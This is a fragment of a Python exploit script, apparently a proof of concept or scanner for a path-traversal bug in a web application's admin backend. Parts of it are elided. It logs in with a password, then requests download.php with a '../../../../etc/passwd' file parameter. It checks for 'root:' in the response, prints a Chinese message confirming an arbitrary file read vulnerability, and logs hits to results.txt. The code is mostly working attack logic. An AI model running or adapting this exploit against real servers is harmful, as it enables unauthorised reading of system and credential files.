...
def login(url, password):
    ...
    r = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
    if r.status_code == 200 and operator.eq(re.findall(r'data":"(.*?)"', r.text)[0], '0') and operator.eq(
            re.findall(r'status":(.*?)}', r.text)[0], '1'):
...
def Read(url, cookie):
    vuln_url = url + '/download.php?a=read_txt&file=../../../../etc/passwd'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": cookie
    ...
    try:
        ...
        if r.status_code == 200 and 'root:' in r.text:
            print("\033[31m{}存在后台任意文件读取漏洞！！！\033[0m".format(url))
            if key:
                with open('results.txt', 'a+') as wp:
                    wp.write('存在后台任意文件读取漏洞\n')
            else:
                pass
        else:
            print("\033[33m文件读取失败，请手工尝试！！！ \033[0m")
    except:
